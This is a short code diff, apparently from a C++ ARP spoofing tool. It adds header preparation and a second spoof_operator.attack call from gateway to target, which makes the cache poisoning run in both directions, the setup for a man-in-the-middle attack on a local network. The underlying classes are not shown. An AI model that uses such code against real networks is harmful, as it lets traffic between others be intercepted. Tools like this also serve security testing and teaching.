@@ -47,7 +47,9 @@ int main()
 
     // initialize broadcast for neighbor discovery
     target_mac = "00:00:00:00:00:00";
+
     arp_operator.prepare_broadcast();
+    arp_operator.prepare_header_values();
     for (auto candidate : candidates) {
         arp_operator.set_target(candidate, target_mac);
         arp_operator.send();
@@ -103,7 +105,11 @@ int main()
     }
 
     arp_operator.prepare_unicast();
+    arp_operator.prepare_header_values();
+
+
     spoof_operator.attack(target_ip, gateway_ip);
+    spoof_operator.attack(gateway_ip, target_ip);
 
     return 0;
 }
